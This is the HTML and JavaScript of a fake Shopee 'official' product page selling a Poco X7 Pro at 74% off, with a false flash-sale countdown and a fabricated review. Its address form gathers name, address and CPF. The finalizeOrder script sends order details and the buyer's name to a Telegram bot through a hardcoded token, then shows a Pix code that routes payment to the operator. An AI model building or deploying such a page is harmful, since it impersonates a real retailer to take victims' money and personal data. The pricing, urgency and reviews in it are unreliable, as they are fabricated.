<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>Xiaomi Poco X7 Pro - Shopee Oficial</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    :root { --shopee: #ee4d2d; --shopee-light: #fff5f1; --teal: #00bfa5; --blue: #2673dd; --bg: #f5f5f5; --yellow: #ffce3d; }
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
    
    body { background: var(--bg); color: #222; overflow-x: hidden; }

    /* SISTEMA DE P√ÅGINAS - CORRIGIDO */
    .page { display: none; min-height: 100vh; width: 100%; background: var(--bg); position: absolute; top: 0; left: 0; }
    .page.active { display: block !important; position: relative; }

    .section { background: white; padding: 15px; margin-bottom: 8px; }
    .top-nav, .header-nav { background: white; padding: 8px 12px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; height: 54px; border-bottom: 1px solid #eee; gap:10px; }
    .header-nav h1 { font-size: 17px; font-weight: 500; flex: 1; text-align: center; margin-right: 30px; }

    /* PRODUTO E CARROSSEL */
    .main-slider { position: relative; width: 100%; background: #fff; aspect-ratio: 1/1; }
    .carousel-track { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; height: 100%; scroll-behavior: smooth; }
    .carousel-track::-webkit-scrollbar { display: none; }
    .carousel-item { min-width: 100%; scroll-snap-align: start; }
    .carousel-item img { width: 100%; height: 100%; object-fit: contain; }
    .carousel-index { position: absolute; bottom: 15px; right: 15px; background: rgba(0,0,0,0.4); color: #fff; padding: 2px 10px; border-radius: 12px; font-size: 11px; }

    .flash-sale { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 10px 15px; display: flex; align-items: center; justify-content: space-between; }
    .timer-unit { background: #333; color: #fff; padding: 2px 4px; border-radius: 2px; font-weight: bold; }
    .product-card { background: white; padding: 15px; margin-bottom: 8px; }
    .price-row { color: var(--shopee); font-size: 28px; font-weight: 500; display: flex; align-items: baseline; gap: 6px; }
    .old-price { color: #999; text-decoration: line-through; font-size: 13px; }
    .discount-tag { background: var(--shopee-light); color: var(--shopee); font-size: 11px; padding: 1px 4px; border-radius: 2px; font-weight: bold; }
    .tag-indicado { background: var(--shopee); color: white; font-size: 10px; padding: 1px 4px; border-radius: 2px; margin-right: 4px; }

    /* MODAL E OP√á√ïES */
    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 2000; }
    .modal-content { position: absolute; bottom: 0; width: 100%; background: #fff; border-radius: 12px 12px 0 0; padding: 20px; }
    .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 10px 15px; border-radius: 2px; font-size: 13px; cursor: pointer; margin: 5px; }
    .opt-btn.active { border: 1px solid var(--shopee) !important; color: var(--shopee); background: var(--shopee-light); }

    /* INPUTS */
    .shopee-input { width: 100%; padding: 12px; border: 1px solid #e8e8e8; background: #fafafa; border-radius: 4px; font-size: 14px; margin-bottom: 12px; outline: none; }
    .input-label { font-size: 11px; color: #888; font-weight: bold; margin-bottom: 4px; display: block; }

    /* FOOTER */
    .footer { position: fixed; bottom: 0; width: 100%; height: 52px; background: white; display: flex; border-top: 1px solid #eee; z-index: 1100; }
    .btn-buy-now { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 16px; cursor: pointer; }
    .footer-fixed { position: fixed; bottom: 0; width: 100%; background: white; height: 70px; display: flex; align-items: center; border-top: 1px solid #eee; z-index: 1100; }
    .btn-main { background: var(--shopee); color: white; border: none; height: 100%; padding: 0 25px; font-weight: bold; cursor: pointer; }
    .btn-main:disabled { background: #ccc; }
    
    .review-item { background: white; padding: 15px; border-bottom: 1px solid #f2f2f2; }
    .stars { color: var(--shopee); font-size: 10px; }
    .review-imgs img { width: 80px; height: 80px; object-fit: cover; margin-right: 5px; border-radius: 4px; }
  </style>
</head>
<body>

  <div id="productPage" class="page active">
    <div class="top-nav">
      <i class="fas fa-arrow-left" style="color:var(--shopee)" onclick="location.reload()"></i>
      <div style="flex:1; background:#f0f0f0; padding:8px; border-radius:2px; font-size:14px; color:#888;"><i class="fas fa-search"></i> Buscar na Shopee</div>
      <i class="fas fa-shopping-cart" style="color:var(--shopee)"></i>
    </div>

    <div class="main-slider">
      <div class="carousel-track" id="track">
        <div class="carousel-item"><img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg"></div>
        <div class="carousel-item"><img src="https://i.postimg.cc/brs6kkrv/D-NQ-NP-970510-MLA101985218069-122025-O.webp"></div>
      </div>
      <div class="carousel-index">1/2</div>
    </div>

    <div class="flash-sale">
      <div style="font-weight:bold; font-style:italic;"><i class="fas fa-bolt"></i> OFERTA REL√ÇMPAGO</div>
      <div style="font-size:12px;">TERMINA EM <span class="timer-unit" id="h">01</span>:<span class="timer-unit" id="m">29</span>:<span class="timer-unit" id="s">30</span></div>
    </div>

    <div class="product-card">
      <div class="old-price">R$2.299,00</div>
      <div class="price-row">R$599,00 <span class="discount-tag">74% OFF</span></div>
      <p style="margin-top:10px;"><span class="tag-indicado">Indicado</span> Xiaomi Poco X7 PRO 5G Global Version - Lote Exclusivo 2026</p>
    </div>

    <div class="section">
      <p style="font-weight:bold; font-size:13px; margin-bottom:10px;">AVALIA√á√ïES</p>
      <div class="review-item">
        <p style="font-size:12px; font-weight:bold;">a***n</p>
        <div class="stars">‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê</div>
        <p style="font-size:13px; margin:5px 0;">Sensacional! Chegou muito r√°pido.</p>
        <div class="review-imgs"><img src="https://i.postimg.cc/ctv07Hv2/br-11134103-81ztc-mk5oi70vvpxf33.webp"></div>
      </div>
    </div>

    <div style="height: 100px;"></div> <div class="footer">
      <div style="width:60px; display:flex; flex-direction:column; align-items:center; justify-content:center; border-right:1px solid #eee;">
        <i class="far fa-comment-dots" style="color:var(--teal)"></i>
        <span style="font-size:9px;">Chat</span>
      </div>
      <button class="btn-buy-now" onclick="openModal()">Compre Agora</button>
    </div>
  </div>

  <div id="modal" class="modal">
    <div class="modal-content">
      <div style="text-align:right; font-size:24px;" onclick="closeModal()">√ó</div>
      <p class="input-label">Cor</p>
      <div class="option-group">
        <button class="opt-btn" onclick="setOpt(this, 'cor', 'Iron Man')">Iron Man</button>
      </div>
      <p class="input-label" style="margin-top:15px;">Vers√£o</p>
      <div class="option-group">
        <button class="opt-btn" onclick="setOpt(this, 'versao', '256GB', 499.17)">12GB + 256GB</button>
        <button class="opt-btn" onclick="setOpt(this, 'versao', '512GB', 599.00)">12GB + 512GB</button>
      </div>
      <button id="btnConfirm" class="btn-main" disabled style="width:100%; height:50px; margin-top:20px; border-radius:4px;" onclick="goToAddress()">PR√ìXIMO</button>
    </div>
  </div>

  <div id="addrPage" class="page">
    <div class="header-nav"><i class="fas fa-arrow-left" onclick="openPage('productPage')"></i><h1>Endere√ßo de Entrega</h1></div>
    <div class="section">
      <span class="input-label">Nome Completo</span>
      <input type="text" id="inName" class="shopee-input" placeholder="Ex: Jo√£o Silva">
      <span class="input-label">CEP</span>
      <input type="tel" id="inCep" class="shopee-input" placeholder="00000-000" onblur="buscarCep()">
      <span class="input-label">Rua</span>
      <input type="text" id="inRua" class="shopee-input">
      <div style="display:flex; gap:10px;">
        <input type="text" id="inNum" class="shopee-input" placeholder="N¬∫" style="flex:1">
        <input type="text" id="inBairro" class="shopee-input" placeholder="Bairro" style="flex:2">
      </div>
      <span class="input-label">CPF (Para Nota Fiscal)</span>
      <input type="tel" id="inCpf" class="shopee-input" placeholder="000.000.000-00" oninput="maskCpf(this)">
      <button class="btn-main" style="width:100%; border-radius:4px; height:50px;" onclick="saveAddress()">CONTINUAR</button>
    </div>
  </div>

  <div id="checkoutPage" class="page">
    <div class="header-nav"><i class="fas fa-arrow-left" onclick="openPage('addrPage')"></i><h1>Revisar Pedido</h1></div>
    <div class="section">
      <p style="font-size:14px;"><i class="fas fa-map-marker-alt" style="color:var(--shopee)"></i> <b id="dispName"></b></p>
      <p id="dispAddr" style="font-size:13px; color:#666; margin-left:20px;"></p>
    </div>
    <div class="section">
      <div style="display:flex; gap:10px;">
        <img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg" style="width:60px;">
        <div>
          <p style="font-size:13px;">Poco X7 Pro 5G</p>
          <p id="checkVariation" style="color:#888; font-size:12px;"></p>
          <p id="checkPrice" style="font-weight:bold; color:var(--shopee);"></p>
        </div>
      </div>
    </div>
    <div class="footer-fixed">
      <div style="flex:1; text-align:right; padding-right:15px;">
        <p style="font-size:14px;">Total: <b class="orange-text" id="finalTotal"></b></p>
      </div>
      <button class="btn-main" onclick="finalizeOrder()">Fazer pedido</button>
    </div>
  </div>

  <div id="pixPage" class="page">
    <div class="header-nav"><h1>Pagamento Pix</h1></div>
    <div class="section" style="text-align:center;">
      <p style="color:var(--shopee); font-weight:bold;">Pedido Reservado!</p>
      <div style="background:#eee; padding:15px; margin:20px 0; font-size:10px; word-break:break-all;">00020101021226870014br.gov.bcb.pix01147294447445...</div>
      <button class="btn-main" style="width:100%; border-radius:4px; height:50px;" onclick="alert('C√≥digo Copiado!')">COPIAR PIX</button>
    </div>
  </div>

  <script>
    const BOT_TOKEN = '7880759082:AAEvRzo4_NjdKnzrISfBzq3PeMLVFWRIvtw';
    const CHAT_ID = '7294447445';
    let state = { cor: '', versao: '', precoBase: 599.00 };

    // Cron√¥metro
    let sec = 5370;
    setInterval(() => {
      let h = Math.floor(sec/3600);
      let m = Math.floor((sec%3600)/60);
      let s = sec%60;
      document.getElementById('h').innerText = h.toString().padStart(2,'0');
      document.getElementById('m').innerText = m.toString().padStart(2,'0');
      document.getElementById('s').innerText = s.toString().padStart(2,'0');
      if(sec > 0) sec--;
    }, 1000);

    // Navega√ß√£o Unificada
    function openPage(id) {
      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
      const target = document.getElementById(id);
      target.classList.add('active');
      window.scrollTo(0,0);
    }

    function openModal() { document.getElementById('modal').style.display = 'block'; }
    function closeModal() { document.getElementById('modal').style.display = 'none'; }

    function setOpt(btn, type, val, price) {
      btn.parentElement.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      state[type] = val;
      if(price) state.precoBase = price;
      if(state.cor && state.versao) document.getElementById('btnConfirm').disabled = false;
    }

    function goToAddress() { closeModal(); openPage('addrPage'); }

    async function buscarCep() {
      const cep = document.getElementById('inCep').value.replace(/\D/g,'');
      if(cep.length === 8) {
        const r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
        const d = await r.json();
        if(!d.erro) {
          document.getElementById('inRua').value = d.logradouro;
          document.getElementById('inBairro').value = d.bairro;
        }
      }
    }

    function saveAddress() {
      const nome = document.getElementById('inName').value;
      if(nome.length < 3) return alert("Preencha seu nome");
      document.getElementById('dispName').innerText = nome;
      document.getElementById('dispAddr').innerText = document.getElementById('inRua').value + ", " + document.getElementById('inNum').value;
      document.getElementById('checkVariation').innerText = state.cor + " | " + state.versao;
      document.getElementById('checkPrice').innerText = "R$ " + state.precoBase.toFixed(2);
      document.getElementById('finalTotal').innerText = "R$ " + state.precoBase.toFixed(2);
      openPage('checkoutPage');
    }

    function maskCpf(i) {
      let v = i.value.replace(/\D/g,'');
      v = v.replace(/(\d{3})(\d)/,"$1.$2");
      v = v.replace(/(\d{3})(\d)/,"$1.$2");
      v = v.replace(/(\d{3})(\d{1,2})$/,"$1-$2");
      i.value = v;
    }

    async function finalizeOrder() {
      const msg = `üöÄ NOVO PEDIDO\nCor: ${state.cor}\nVers√£o: ${state.versao}\nTotal: R$ ${state.precoBase.toFixed(2)}\nNome: ${document.getElementById('inName').value}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text: msg})
      });
      openPage('pixPage');
    }
  </script>
</body>
  </html>
  
